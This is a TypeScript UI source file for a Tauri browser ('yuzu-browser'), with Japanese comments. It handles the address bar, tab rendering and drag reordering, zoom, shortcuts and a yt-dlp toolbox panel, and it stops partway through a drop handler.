// yuzu-browser UI — アドレスバー + タブバー専用 webview。
// 表示は別 view webview（タブごと）が担当し、こちらは Tauri の invoke で操作する。

import { invoke } from "@tauri-apps/api/core";
import { listen } from "@tauri-apps/api/event";

const HOME_URL = "https://duckduckgo.com/";
const SEARCH_URL = "https://duckduckgo.com/?q=";

interface TabInfo {
  id: number;
  url: string;
  title: string;
  active: boolean;
  muted: boolean;
  audible: boolean;
  favicon: string;
}

let input: HTMLInputElement;
let tabsEl: HTMLDivElement;
let tabs: TabInfo[] = [];
/** 直前に UI が「アクティブ」とみなしていたタブ id。タブが切り替わったら入力途中でもアドレスバーを強制更新する。 */
let lastActiveTabId: number | null = null;

/** 入力を URL に解決。URL らしくなければ DuckDuckGo 検索 URL にフォールバック。 */
function resolveQuery(raw: string): string {
  const q = raw.trim();
  if (!q) return HOME_URL;
  if (/^[a-z][a-z0-9+.-]*:\/\//i.test(q)) return q;
  if (/^(localhost|127\.0\.0\.1)(:\d+)?(\/.*)?$/i.test(q)) return "http://" + q;
  if (!/\s/.test(q) && /^[^\s/?#]+\.[a-z]{2,}([/:?#].*)?$/i.test(q)) {
    return "https://" + q;
  }
  return SEARCH_URL + encodeURIComponent(q);
}

function activeTab(): TabInfo | undefined {
  return tabs.find((t) => t.active);
}

async function navigate(url: string): Promise<void> {
  input.value = url;
  try {
    await invoke("browser_navigate", { url });
  } catch (e) {
    console.error("navigate failed:", e);
  }
}

async function history(
  action: "back" | "forward" | "reload" | "hard_reload",
): Promise<void> {
  try {
    await invoke("browser_history", { action });
  } catch (e) {
    console.error("history failed:", e);
  }
}

async function tabNew(url?: string): Promise<void> {
  try {
    await invoke("tab_new", { url: url ?? HOME_URL });
  } catch (e) {
    console.error("tab_new failed:", e);
  }
}

async function tabClose(id: number): Promise<void> {
  try {
    await invoke("tab_close", { id });
  } catch (e) {
    console.error("tab_close failed:", e);
    // バックエンドからの拒否メッセージ (ダウンロード中など) は素直にユーザに見せる。
    const msg = String(e ?? "");
    if (msg) {
      try {
        // alert は WebView2 でも素朴に動く。
        // eslint-disable-next-line no-alert
        window.alert(msg);
      } catch {
        /* noop */
      }
    }
  }
}

async function tabSwitch(id: number): Promise<void> {
  try {
    await invoke("tab_switch", { id });
  } catch (e) {
    console.error("tab_switch failed:", e);
  }
}

async function tabDuplicate(id: number): Promise<void> {
  try {
    await invoke("tab_duplicate", { id });
  } catch (e) {
    console.error("tab_duplicate failed:", e);
  }
}

async function tabReopen(): Promise<void> {
  try {
    await invoke("tab_reopen");
  } catch (e) {
    console.error("tab_reopen failed:", e);
  }
}

async function tabCloseOthers(id: number): Promise<void> {
  try {
    await invoke("tab_close_others", { id });
  } catch (e) {
    console.error("tab_close_others failed:", e);
  }
}

async function tabCloseRight(id: number): Promise<void> {
  try {
    await invoke("tab_close_right", { id });
  } catch (e) {
    console.error("tab_close_right failed:", e);
  }
}

async function tabReorder(id: number, toIndex: number): Promise<void> {
  try {
    await invoke("tab_reorder", { id, toIndex });
  } catch (e) {
    console.error("tab_reorder failed:", e);
  }
}

/** 表示用のタブ名を作る。ページタイトルがあればそれ、なければホスト名。 */
function tabLabel(t: TabInfo): string {
  if (t.title && t.title.trim()) return t.title;
  return urlToTitle(t.url);
}

/** URL からタイトル文字列を作る（ホスト名）。 */
function urlToTitle(url: string): string {
  try {
    const u = new URL(url);
    if (u.hostname) return u.hostname.replace(/^www\./, "");
    return url;
  } catch {
    return url || "新しいタブ";
  }
}

/** バックエンドが favicon を取得できていないときの推測 URL。 */
function faviconFallback(url: string): string {
  try {
    const u = new URL(url);
    if (u.protocol !== "http:" && u.protocol !== "https:") return "";
    return `${u.origin}/favicon.ico`;
  } catch {
    return "";
  }
}

/** 1x1 透明 PNG (壊れた img の代わりに使う)。 */
const TRANSPARENT_PIXEL =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkAAIAAAoAAv/lxKUAAAAASUVORK5CYII=";

/** favicon img に段階的フォールバック (favicon → /favicon.ico → 透明) を仕込む。
 * load 失敗をブラウザの「壊れた画像」アイコンで見せないために、
 * 必ず error ハンドラを src 設定より前に登録する。 */
function setupCascadingFavicon(
  img: HTMLImageElement,
  primary: string,
  pageUrl: string,
): void {
  const fallback1 = faviconFallback(pageUrl);
  const candidates: string[] = [];
  if (primary) candidates.push(primary);
  if (fallback1 && !candidates.includes(fallback1)) candidates.push(fallback1);
  let idx = 0;
  img.addEventListener("error", () => {
    idx += 1;
    if (idx < candidates.length) {
      img.src = candidates[idx];
    } else {
      // すべて失敗 → 透明ピクセルに置き換えて灰色プレースホルダを表示。
      img.classList.add("is-fallback");
      img.src = TRANSPARENT_PIXEL;
    }
  });
  if (candidates.length === 0) {
    img.classList.add("is-fallback");
    img.src = TRANSPARENT_PIXEL;
  } else {
    img.src = candidates[0];
  }
}

function renderTabs(): void {
  tabsEl.innerHTML = "";
  for (const t of tabs) {
    const el = document.createElement("div");
    el.className = "tab" + (t.active ? " active" : "");
    el.dataset.id = String(t.id);
    el.title = t.url;
    // HTML5 DnD は WebView2 で挙動が不安定なので使わない (pointer events で実装)。
    el.draggable = false;

    // favicon
    const fav = document.createElement("img");
    fav.className = "tab-favicon";
    fav.alt = "";
    fav.referrerPolicy = "no-referrer";
    fav.draggable = false;
    setupCascadingFavicon(fav, t.favicon, t.url);
    el.appendChild(fav);

    const title = document.createElement("span");
    title.className = "tab-title";
    title.textContent = tabLabel(t);
    el.appendChild(title);

    // タブ内ミュートボタン：「音が鳴っている」または「ミュート中」のときだけ表示。
    if (t.audible || t.muted) {
      const mute = document.createElement("button");
      mute.className = "tab-mute" + (t.muted ? " is-muted" : "");
      mute.type = "button";
      mute.textContent = t.muted ? "🔇" : "🔊";
      mute.title = t.muted ? "ミュートを解除" : "このタブをミュート";
      mute.addEventListener("click", (e) => {
        e.stopPropagation();
        void invoke("tab_set_volume", {
          id: t.id,
          volume: t.muted ? 1.0 : 0.0,
        }).catch((err) => console.error("tab_set_volume failed:", err));
      });
      el.appendChild(mute);
    }

    const close = document.createElement("button");
    close.className = "tab-close";
    close.type = "button";
    close.textContent = "×";
    close.title = "タブを閉じる";
    close.addEventListener("click", (e) => {
      e.stopPropagation();
      const id = t.id;
      setTimeout(() => {
        void tabClose(id);
      }, 0);
    });
    el.appendChild(close);

    // --- pointer event ベースのタブクリック / 並び替え / 切り離し ---
    // HTML5 DnD は WebView2 で取りこぼしが多いので使わない。
    el.addEventListener("pointerdown", (e) => {
      const pe = e as PointerEvent;
      if ((pe.target as HTMLElement).closest("button")) return;
      // 中クリック: pointerdown ではオートスクロール抑止のみ。
      // 実際の tabClose は auxclick (リリース後) で行う。
      if (pe.button === 1) {
        e.preventDefault();
        e.stopPropagation();
        return;
      }
      if (pe.button !== 0) return;
      e.preventDefault();
      startTabDrag(t.id, el, pe);
    });
    el.addEventListener("auxclick", (e) => {
      const me = e as MouseEvent;
      if (me.button === 1) {
        e.preventDefault();
        e.stopPropagation();
        const id = t.id;
        setTimeout(() => {
          void tabClose(id);
        }, 0);
      }
    });
    el.addEventListener("contextmenu", (e) => {
      e.preventDefault();
      void invoke("show_tab_context_menu", { id: t.id }).catch((err) =>
        console.error("show_tab_context_menu failed:", err),
      );
    });

    tabsEl.appendChild(el);
  }
}

/** タブの pointerdown 時に呼ばれ、ドラッグ閾値を超えたら並び替え/切り離しを行う。 */
function startTabDrag(
  tabId: number,
  el: HTMLDivElement,
  downEvt: PointerEvent,
): void {
  const startX = downEvt.clientX;
  const startY = downEvt.clientY;
  let dragging = false;
  let lastX = startX;
  let lastY = startY;

  const setDropMarkers = (x: number) => {
    document
      .querySelectorAll(".tab.drop-before, .tab.drop-after")
      .forEach((n) => n.classList.remove("drop-before", "drop-after"));
    const target = findTabAtX(x, tabId);
    if (!target) return;
    const r = target.el.getBoundingClientRect();
    const before = x < r.left + r.width / 2;
    target.el.classList.toggle("drop-before", before);
    target.el.classList.toggle("drop-after", !before);
  };

  const onMove = (ev: PointerEvent) => {
    lastX = ev.clientX;
    lastY = ev.clientY;
    if (!dragging) {
      if (
        Math.abs(ev.clientX - startX) > 5 ||
        Math.abs(ev.clientY - startY) > 5
      ) {
        dragging = true;
        el.classList.add("dragging");
      } else {
        return;
      }
    }
    setDropMarkers(ev.clientX);
  };

  const onUp = (ev: PointerEvent) => {
    window.removeEventListener("pointermove", onMove, true);
    window.removeEventListener("pointerup", onUp, true);
    window.removeEventListener("pointercancel", onCancel, true);
    document
      .querySelectorAll(".tab.drop-before, .tab.drop-after")
      .forEach((n) => n.classList.remove("drop-before", "drop-after"));
    el.classList.remove("dragging");
    if (!dragging) {
      // ただのクリック → タブ切替。pointerup ハンドラ内で同期 invoke すると
      // WebView2 のマウスキャプチャ解除と競合してハングするため遅延させる。
      const id = tabId;
      setTimeout(() => {
        void tabSwitch(id);
      }, 0);
      return;
    }
    // ドロップ位置でアクション決定
    const tabbar = document.querySelector(".tabbar");
    if (!tabbar) return;
    const rect = tabbar.getBoundingClientRect();
    const farOutside =
      ev.clientY < rect.top - 60 || ev.clientY > rect.bottom + 60;
    if (farOutside) {
      // タブバーから大きく離れたドロップ。
      // 1) まずカーソル下に「自プロセスの別 yuzu ウィンドウ」があれば
      //    そこへ reparent (Firefox 風タブマージ、再生継続)。
      // 2) 別プロセスの yuzu があれば IPC で URL を送って新規タブ化。
      // 3) いずれもなければ同プロセス内で新ウィンドウへ切り離す。
      const tab = tabs.find((t) => t.id === tabId);
      const url = tab?.url || "";
      void (async () => {
        try {
          const targetWin = await invoke<string | null>(
            "tab_drop_target_window",
          );
          if (targetWin) {
            await invoke("tab_reattach", {
              id: tabId,
              targetWindow: targetWin,
            });
            return;
          }
          const pid = await invoke<number | null>("tab_drop_target_pid");
          if (pid && url) {
            await invoke("tab_attach", { pid, url });
            await invoke("tab_close", { id: tabId });
            return;
          }
          // 同一プロセス内の新ウィンドウへ reparent（再生継続）。
          await invoke("tab_detach", { id: tabId });
        } catch (err) {
          console.error("tab drop failed:", err);
        }
      })();
      return;
    }
    // 並び替え
    const target = findTabAtX(ev.clientX, tabId);
    if (!target) return;
    const r = target.el.getBoundingClientRect();
    const before = ev.clientX < r.left + r.width / 2;
    const fromIdx = tabs.findIndex((x) => x.id === tabId);
    if (fromIdx < 0) return;
    let to = before ? target.index : target.index + 1;
    if (fromIdx < to) to -= 1;
    if (to === fromIdx) return;
    void tabReorder(tabId, to);
  };

  const onCancel = () => {
    window.removeEventListener("pointermove", onMove, true);
    window.removeEventListener("pointerup", onUp, true);
    window.removeEventListener("pointercancel", onCancel, true);
    document
      .querySelectorAll(".tab.drop-before, .tab.drop-after")
      .forEach((n) => n.classList.remove("drop-before", "drop-after"));
    el.classList.remove("dragging");
  };

  // last* unused-warning 抑止
  void lastX;
  void lastY;

  window.addEventListener("pointermove", onMove, true);
  window.addEventListener("pointerup", onUp, true);
  window.addEventListener("pointercancel", onCancel, true);
}

/** 与えられた x 座標に最も近いタブ (自分以外) を返す。 */
function findTabAtX(
  x: number,
  selfId: number,
): { el: HTMLDivElement; index: number } | null {
  const els = Array.from(tabsEl.querySelectorAll<HTMLDivElement>(".tab"));
  let best: { el: HTMLDivElement; index: number; dist: number } | null = null;
  for (let i = 0; i < els.length; i++) {
    const e = els[i];
    if (Number(e.dataset.id) === selfId) continue;
    const r = e.getBoundingClientRect();
    let dist: number;
    if (x < r.left) dist = r.left - x;
    else if (x > r.right) dist = x - r.right;
    else dist = 0;
    if (best === null || dist < best.dist) {
      best = { el: e, index: i, dist };
    }
  }
  return best ? { el: best.el, index: best.index } : null;
}

/** ネイティブコンテキストメニューの選択結果を処理。 */
function handleTabMenuAction(action: string, id: number): void {
  switch (action) {
    case "new":
      void tabNew();
      break;
    case "duplicate":
      void tabDuplicate(id);
      break;
    case "reload":
      void tabSwitch(id).then(() => history("reload"));
      break;
    case "reopen":
      void tabReopen();
      break;
    case "close_right":
      void tabCloseRight(id);
      break;
    case "close_others":
      void tabCloseOthers(id);
      break;
    case "close":
      void tabClose(id);
      break;
  }
}

/** view webview が遷移したら、対応タブが active のときだけアドレスバーへ反映。 */
function onViewNavigated(payload: { id: number; url: string }): void {
  const t = tabs.find((x) => x.id === payload.id);
  if (t) t.url = payload.url;
  renderTabs();
  const active = activeTab();
  if (active && active.id === payload.id) {
    // 「ユーザーが今アドレスバーを編集中」の判定は
    // (UI webview にフォーカスがある) かつ (input が activeElement) のときだけ。
    // view webview がフォーカスを持っている間は UI 側はフォーカスを失うため
    // document.hasFocus() == false になり、確実に URL を上書きできる。
    const editing = document.hasFocus() && document.activeElement === input;
    if (!editing) {
      input.value = payload.url;
    }
    updateBookmarkToggle();
  }
}

function onTabsUpdated(next: TabInfo[]): void {
  tabs = next;
  renderTabs();
  const active = activeTab();
  // アクティブタブが切り替わったら入力途中でもアドレスバーを強制同期。
  const activeId = active ? active.id : null;
  if (activeId !== lastActiveTabId) {
    if (active) input.value = active.url;
    lastActiveTabId = activeId;
  } else if (active) {
    const editing = document.hasFocus() && document.activeElement === input;
    if (!editing) {
      input.value = active.url;
    }
  }
  // 音量・ズーム表示を active タブに同期
  if (active) {
    void syncControlsForTab(active.id);
  }
  updateBookmarkToggle();
}

/** 指定タブのズームをツールバー UI に反映。 */
async function syncControlsForTab(_id: number): Promise<void> {
  try {
    const z = await invoke<number>("tab_get_zoom");
    if (zoomDisplayEl) zoomDisplayEl.textContent = Math.round(z * 100) + "%";
  } catch (_) {
    /* ignore */
  }
}

let zoomDisplayEl: HTMLSpanElement | null = null;

window.addEventListener("DOMContentLoaded", () => {
  // 中クリックのオートスクロール抑止は Chromium フラグ
  // (--disable-features=MiddleClickAutoscroll) で行うため JS 側では何もしない。
  // mousedown を capture で preventDefault するとフォーカスや click 生成が
  // 壊れて新規タブ生成がトリガされなくなることがあるため除去した。

  input = document.getElementById("address") as HTMLInputElement;
  tabsEl = document.getElementById("tabs") as HTMLDivElement;
  const form = document.getElementById("address-form") as HTMLFormElement;
  const backBtn = document.getElementById("back") as HTMLButtonElement | null;
  const forwardBtn = document.getElementById(
    "forward",
  ) as HTMLButtonElement | null;
  const reloadBtn = document.getElementById(
    "reload",
  ) as HTMLButtonElement | null;
  const superReloadBtn = document.getElementById(
    "super-reload",
  ) as HTMLButtonElement | null;
  const newTabBtn = document.getElementById("new-tab") as HTMLButtonElement;

  form.addEventListener("submit", (e) => {
    e.preventDefault();
    const raw = input.value.trim();
    // "AI:質問" / "ai:質問" → AI ツールに転送して質問
    const m = raw.match(/^(?:AI|ai|Ai|aI)\s*[:：]\s*(.+)$/);
    if (m) {
      const q = m[1].trim();
      void runAIFromAddressBar(q);
      return;
    }
    void navigate(resolveQuery(raw));
  });
  input.addEventListener("focus", () => {
    input.select();
  });

  backBtn?.addEventListener("click", () => void history("back"));
  forwardBtn?.addEventListener("click", () => void history("forward"));
  reloadBtn?.addEventListener("click", () => void history("reload"));
  superReloadBtn?.addEventListener("click", () => void history("hard_reload"));
  newTabBtn.addEventListener("click", () => void tabNew());

  // タブバーへの URL ドラッグ&ドロップ → 新しいタブで開く。
  const tabbar = document.querySelector(".tabbar") as HTMLElement | null;
  if (tabbar) {
    tabbar.addEventListener("dragover", (e) => {
      const dt = (e as DragEvent).dataTransfer;
      if (!dt) return;
      // URI または text を含むドラッグだけ受け付ける。
      const types = Array.from(dt.types || []);
      if (
        types.includes("text/uri-list") ||
        types.includes("text/plain") ||
        types.includes("text/x-moz-url")
      ) {
        e.preventDefault();
        dt.dropEffect = "copy";
        tabbar.classList.add("drop-url");
      }
    });
    tabbar.addEventListener("dragleave", (e) => {
      // タブバーから完全に離れたときだけハイライト解除。
      if (e.target === tabbar) tabbar.classList.remove("drop-url");
    });
    tabbar.addEventListener("drop", (e) => {
      const dt = (e as DragEvent).dataTransfer;
      if (!dt) return;
      e.preventDefault();
      tabbar.classList.remove("drop-url");
      const raw =
        dt.getData("text/uri-list") ||
        dt.getData("text/x-moz-url") ||
        dt.getData("text/plain");
      if (!raw) return;
      // text/uri-list は複数行 (# はコメント) を含むことがある。先頭の有効行だけ採用。
      const url = raw
        .split(/\r?\n/)
        .map((s) => s.trim())
        .find((s) => s && !s.startsWith("#"));
      if (!url) return;
      void tabNew(resolveQuery(url));
    });
  }

  // ズームコントロール
  zoomDisplayEl = document.getElementById(
    "zoom-display",
  ) as HTMLSpanElement | null;
  const zoomInBtn = document.getElementById(
    "zoom-in",
  ) as HTMLButtonElement | null;
  const zoomOutBtn = document.getElementById(
    "zoom-out",
  ) as HTMLButtonElement | null;
  if (zoomInBtn) {
    zoomInBtn.addEventListener("click", () => {
      void invoke("active_tab_zoom_delta", { delta: 0.1 }).catch((e) =>
        console.error("zoom_delta failed:", e),
      );
    });
  }
  if (zoomOutBtn) {
    zoomOutBtn.addEventListener("click", () => {
      void invoke("active_tab_zoom_delta", { delta: -0.1 }).catch((e) =>
        console.error("zoom_delta failed:", e),
      );
    });
  }
  if (zoomDisplayEl) {
    zoomDisplayEl.addEventListener("click", () => {
      void invoke("active_tab_zoom_set", { zoom: 1.0 }).catch((e) =>
        console.error("zoom_set failed:", e),
      );
    });
  }

  // ページ翻訳ボタン
  setupPageTranslate();

  // UI webview 上での Ctrl+ホイール（ツールバー上など）もズームに使う
  window.addEventListener(
    "wheel",
    (e) => {
      if (!e.ctrlKey) return;
      e.preventDefault();
      const delta = e.deltaY < 0 ? 0.1 : -0.1;
      void invoke("active_tab_zoom_delta", { delta }).catch(() => {});
    },
    { passive: false },
  );

  // ショートカット
  window.addEventListener("keydown", (e) => {
    const k = e.key.toLowerCase();
    if (e.ctrlKey && !e.shiftKey && k === "t") {
      e.preventDefault();
      void tabNew();
    } else if (e.ctrlKey && e.shiftKey && k === "t") {
      e.preventDefault();
      void tabReopen();
    } else if (e.ctrlKey && k === "w") {
      e.preventDefault();
      const a = activeTab();
      if (a) void tabClose(a.id);
    } else if (e.ctrlKey && k === "l") {
      e.preventDefault();
      input.focus();
    } else if (e.ctrlKey && e.shiftKey && k === "r") {
      // Ctrl+Shift+R: スーパーリロード（キャッシュ無視）
      e.preventDefault();
      void history("hard_reload");
    } else if (e.ctrlKey && !e.shiftKey && k === "r") {
      // Ctrl+R: 通常リロード
      e.preventDefault();
      void history("reload");
    } else if (e.key === "F5") {
      e.preventDefault();
      void history(e.ctrlKey || e.shiftKey ? "hard_reload" : "reload");
    } else if (e.ctrlKey && k === "d" && e.shiftKey) {
      // Ctrl+Shift+D でタブ複製
      e.preventDefault();
      const a = activeTab();
      if (a) void tabDuplicate(a.id);
    } else if (e.ctrlKey && !e.shiftKey && k === "d") {
      // Ctrl+D で現在のページをブックマーク
      e.preventDefault();
      void toggleBookmarkCurrent();
    } else if (e.ctrlKey && k === "tab") {
      e.preventDefault();
      const idx = tabs.findIndex((t) => t.active);
      if (idx < 0 || tabs.length === 0) return;
      const next = e.shiftKey
        ? (idx - 1 + tabs.length) % tabs.length
        : (idx + 1) % tabs.length;
      void tabSwitch(tabs[next].id);
    } else if (e.ctrlKey && /^[1-9]$/.test(e.key)) {
      // Ctrl+1..8 で番号タブ、Ctrl+9 で最後のタブ
      e.preventDefault();
      const n = Number(e.key);
      const target = n === 9 ? tabs[tabs.length - 1] : tabs[n - 1];
      if (target) void tabSwitch(target.id);
    } else if (e.ctrlKey && e.key === "0") {
      e.preventDefault();
      void invoke("active_tab_zoom_set", { zoom: 1.0 }).catch(() => {});
    } else if (e.ctrlKey && (e.key === "+" || e.key === "=")) {
      e.preventDefault();
      void invoke("active_tab_zoom_delta", { delta: 0.1 }).catch(() => {});
    } else if (e.ctrlKey && e.key === "-") {
      e.preventDefault();
      void invoke("active_tab_zoom_delta", { delta: -0.1 }).catch(() => {});
    }
  });

  void listen<{ id: number; zoom: number }>("tab-zoom-changed", (event) => {
    const a = activeTab();
    if (!a || a.id !== event.payload.id) return;
    if (zoomDisplayEl)
      zoomDisplayEl.textContent = Math.round(event.payload.zoom * 100) + "%";
  });

  void listen<{ id: number; url: string }>("view-navigated", (event) => {
    onViewNavigated(event.payload);
    // ユーザースクリプト注入 (URL マッチで自動)
    void injectUserScriptsForTab(event.payload.id, event.payload.url);
  });
  void listen<TabInfo[]>("tabs-updated", (event) => {
    onTabsUpdated(event.payload);
  });
  void listen<{ url: string }>("external-open-tab", (event) => {
    // 他の yuzu-browser インスタンスからタブをドロップされた。
    if (event.payload.url) void tabNew(event.payload.url);
  });
  void listen<{ action: string; id: number }>("tab-menu-action", (event) => {
    handleTabMenuAction(event.payload.action, event.payload.id);
  });

  // ツールボックス UI を初期化
  void setupToolbox();

  // ダウンロード UI を初期化（ツールボックスから開くパネル）
  void setupDownloadsUI();

  // ブックマーク UI を初期化
  void setupBookmarks();

  // 初期タブリスト取得 + バックエンドへ chrome 準備完了を通知。
  // バックエンドは chrome_ready を受け取ったら即座に tabs-updated を再 emit するので、
  // detach/reattach 直後の取りこぼしも吸収できる。
  void invoke<TabInfo[]>("tab_list")
    .then(onTabsUpdated)
    .catch((e) => {
      console.error("tab_list failed:", e);
    });
  void invoke("chrome_ready").catch((e) => {
    console.error("chrome_ready failed:", e);
  });
});

// ===== ツールボックス =====

interface ToolboxSettings {
  download_dir: string;
}

let toolboxPanel: HTMLDivElement | null = null;
let toolboxOpen = false;
let ytdlpRunBtn: HTMLButtonElement | null = null;
let ytdlpCancelBtn: HTMLButtonElement | null = null;
let ytdlpUrlInput: HTMLInputElement | null = null;
let ytdlpDirInput: HTMLInputElement | null = null;
let ytdlpModeSel: HTMLSelectElement | null = null;
let ytdlpQualitySel: HTMLSelectElement | null = null;
let ytdlpLogEl: HTMLPreElement | null = null;
let ytdlpStatusEl: HTMLSpanElement | null = null;
let ytdlpFillBtn: HTMLButtonElement | null = null;
let ytdlpPickDirBtn: HTMLButtonElement | null = null;
let toolboxOpenBtn: HTMLButtonElement | null = null;
let toolboxCloseBtn: HTMLButtonElement | null = null;
let currentJobId: number | null = null;

async function loadToolboxSettings(): Promise<void> {
  try {
    const s = await invoke<ToolboxSettings>("toolbox_settings_get");
    if (ytdlpDirInput) ytdlpDirInput.value = s.download_dir || "";
  } catch (e) {
    console.error("toolbox_settings_get failed:", e);
  }
}

async function saveToolboxSettings(): Promise<void> {
  const settings: ToolboxSettings = {
    download_dir: ytdlpDirInput?.value ?? "",
  };
  try {
    await invoke("toolbox_settings_set", { settings });
  } catch (e) {
    console.error("toolbox_settings_set failed:", e);
  }
}

async function openToolboxPanel(): Promise<void> {
  if (!toolboxPanel) return;
  try {
    await invoke("ui_set_expanded", { expanded: true });
  } catch (e) {
    console.error("ui_set_expanded failed:", e);
  }
  toolboxPanel.style.display = "";
  toolboxPanel.hidden = false;
  toolboxOpen = true;
  await loadToolboxSettings();
  // 現在ページ URL を予め埋めない (ユーザー操作優先)
}

async function closeToolboxPanel(): Promise<void> {
  if (!toolboxPanel) return;
  toolboxPanel.hidden = true;
  toolboxPanel.style.display = "none";
  toolboxOpen = false;
  try {
    await invoke("ui_set_expanded", { expanded: false });
  } catch (e) {
    console.error("ui_set_expanded failed:", e);
  }
}

function appendYtdlpLog(line: string, kind: string): void {
  if (!ytdlpLogEl) return;
  const span = document.createElement("span");
  if (kind === "stderr") span.className = "log-stderr";
  else if (kind === "info") span.className = "log-info";
  span.textContent = line + "\n";
  ytdlpLogEl.appendChild(span);
  ytdlpLogEl.scrollTop = ytdlpLogEl.scrollHeight;
}

async function setupToolbox(): Promise<void> {
  toolboxPanel = document.getElementById(
    "toolbox-panel",
  ) as HTMLDivElement | null;
  toolboxOpenBtn = document.getElementById(
    "toolbox-open",
  ) as HTMLButtonElement | null;
  toolboxCloseBtn = document.getElementById(
    "toolbox-close",
  ) as HTMLButtonElement | null;
  ytdlpRunBtn = document.getElementById(
    "ytdlp-run",
  ) as HTMLButtonElement | null;
  ytdlpCancelBtn = document.getElementById(
    "ytdlp-cancel",
  ) as HTMLButtonElement | null;
  ytdlpUrlInput = document.getElementById(
    "ytdlp-url",
  ) as HTMLInputElement | null;
  ytdlpDirInput = document.getElementById(
    "ytdlp-dir",
  ) as HTMLInputElement | null;
  ytdlpModeSel = document.getElementById(
    "ytdlp-mode",
  ) as HTMLSelectElement | null;
  ytdlpQualitySel = document.getElementById(
    "ytdlp-quality",
  ) as HTMLSelectElement | null;
  ytdlpLogEl = document.getElementById("ytdlp-log") as HTMLPreElement | null;
  ytdlpStatusEl = document.getElementById(
    "ytdlp-status",
  ) as HTMLSpanElement | null;
  ytdlpFillBtn = document.getElementById(
    "ytdlp-fill-current",
  ) as HTMLButtonElement | null;
  ytdlpPickDirBtn = document.getElementById(
    "ytdlp-pick-dir",
  ) as HTMLButtonElement | null;

  toolboxOpenBtn?.addEventListener("click", () => {
    void (toolboxOpen ? closeToolboxPanel() : openToolboxPanel());
  });
  toolboxCloseBtn?.addEventListener("click", () => void closeToolboxPanel());

  // ツール切替ナビ
  const navItems = document.querySelectorAll<HTMLButtonElement>(
    "#toolbox-nav .toolbox-nav-item",
  );
  const sections = document.querySelectorAll<HTMLElement>(
    "#toolbox-content .toolbox-tool",
  );
  const selectTool = (name: string): void => {
    navItems.forEach((b) => {
      b.classList.toggle("active", b.dataset.tool === name);
    });
    sections.forEach((s) => {
      s.hidden = s.dataset.tool !== name;
    });
  };
  navItems.forEach((btn) => {
    btn.addEventListener("click", () => {
      const t = btn.dataset.tool;
      if (t) selectTool(t);
    });
  });

  // ===== ツールの並び替え (D&D) =====
  // localStorage に並び順を保存して再起動後も維持する。
  // カテゴリ見出し (.toolbox-nav-cat) は固定位置のまま、
  // ツール項目だけを「同一カテゴリ内で」並び替える。
  // (旧バージョンではフラット保存しており、復元時にカテゴリ境界を超えて
  //  全項目が末尾カテゴリに集約されてしまう不具合があった。v4 で修正。)
  const navParent = document.getElementById("toolbox-nav");
  const TOOL_ORDER_KEY = "yuzu-toolbox-order-v4";
  // 旧キーが残っていると混乱の元なので掃除する。
  try {
    localStorage.removeItem("yuzu-toolbox-order-v3");
    localStorage.removeItem("yuzu-toolbox-order-v2");
    localStorage.removeItem("yuzu-toolbox-order");
  } catch {
    /* noop */
  }
  // 指定ツールボタンが属するカテゴリ見出し要素を返す (なければ null)。
  const categoryOf = (el: Element): HTMLElement | null => {
    let n: Element | null = el.previousElementSibling;
    while (n) {
      if (n.classList.contains("toolbox-nav-cat")) return n as HTMLElement;
      n = n.previousElementSibling;
    }
    return null;
  };
  // カテゴリ毎の現在の並び順を { カテゴリ見出し文字列: [tool, ...] } で保存。
  const persistToolOrder = (): void => {
    if (!navParent) return;
    const order: Record<string, string[]> = {};
    navParent
      .querySelectorAll<HTMLButtonElement>(".toolbox-nav-item")
      .forEach((b) => {
        const t = b.dataset.tool;
        if (!t) return;
        const cat = categoryOf(b)?.textContent?.trim() || "";
        if (!order[cat]) order[cat] = [];
        order[cat].push(t);
      });
    try {
      localStorage.setItem(TOOL_ORDER_KEY, JSON.stringify(order));
    } catch {
      /* noop */
    }
  };
  // 起動直後に保存済みの順序を反映する (カテゴリ内のみ)。
  if (navParent) {
    try {
      const raw = localStorage.getItem(TOOL_ORDER_KEY);
      if (raw) {
        const saved = JSON.parse(raw) as unknown;
        if (saved && typeof saved === "object" && !Array.isArray(saved)) {
          // カテゴリごとに、現在その配下にあるツール要素を順に並び替える。
          const cats =
            navParent.querySelectorAll<HTMLElement>(".toolbox-nav-cat");
          cats.forEach((catEl) => {
            const catKey = catEl.textContent?.trim() || "";
            const want = (saved as Record<string, unknown>)[catKey];
            if (!Array.isArray(want)) return;
            // このカテゴリに属する現行ツール要素を集める。
            const items: HTMLElement[] = [];
            let n: Element | null = catEl.nextElementSibling;
            while (n && !n.classList.contains("toolbox-nav-cat")) {
              if (n.classList.contains("toolbox-nav-item"))
                items.push(n as HTMLElement);
              n = n.nextElementSibling;
            }
            const map = new Map<string, HTMLElement>();
            items.forEach((b) => {
              const t = (b as HTMLButtonElement).dataset.tool;
              if (t) map.set(t, b);
            });
            // 次のカテゴリ見出し (= 末端マーカー) を anchor として、
            // 保存順に insertBefore していく。
            let anchor: Element | null = catEl.nextElementSibling;
            while (anchor && !anchor.classList.contains("toolbox-nav-cat")) {
              anchor = anchor.nextElementSibling;
            }
            for (const t of want) {
              if (typeof t !== "string") continue;
              const el = map.get(t);
              if (el) navParent.insertBefore(el, anchor);
            }
            // 保存に含まれない新規ツールは元位置 (anchor 直前) に残る。
          });
        }
      }
    } catch {
      /* noop */
    }
  }
  navItems.forEach((btn) => {
    btn.setAttribute("draggable", "true");
    btn.addEventListener("dragstart", (e) => {
      const dt = (e as DragEvent).dataTransfer;
      if (!dt) return;
      dt.effectAllowed = "move";
      dt.setData("text/x-yuzu-tool", btn.dataset.tool || "");
      btn.classList.add("dragging");
    });
    btn.addEventListener("dragend", () => {
      btn.classList.remove("dragging");
      navParent
        ?.querySelectorAll(".toolbox-nav-item.drag-over")
        .forEach((n) => n.classList.remove("drag-over"));
    });
    btn.addEventListener("dragover", (e) => {
      const dt = (e as DragEvent).dataTransfer;
      if (!dt) return;
      // 自分自身のツール D&D かどうかは types で判別。
      if (!Array.from(dt.types || []).includes("text/x-yuzu-tool")) return;
      // カテゴリを跨ぐ並び替えは禁止 (見た目のジャンル分けを保つため)。
      // dragover では dataTransfer.getData が空になる場合があるので、
      // 「ドラッグ中の要素」を navParent から探して比較する。
      const dragging = navParent?.querySelector(
        ".toolbox-nav-item.dragging",
      ) as HTMLElement | null;
      if (dragging && categoryOf(dragging) !== categoryOf(btn)) return;
      e.preventDefault();
      dt.dropEffect = "move";
      btn.classList.add("drag-over");
    });
    btn.addEventListener("dragleave", () => {
      btn.classList.remove("drag-over");
    });
    btn.addEventListener("drop", (e) => {
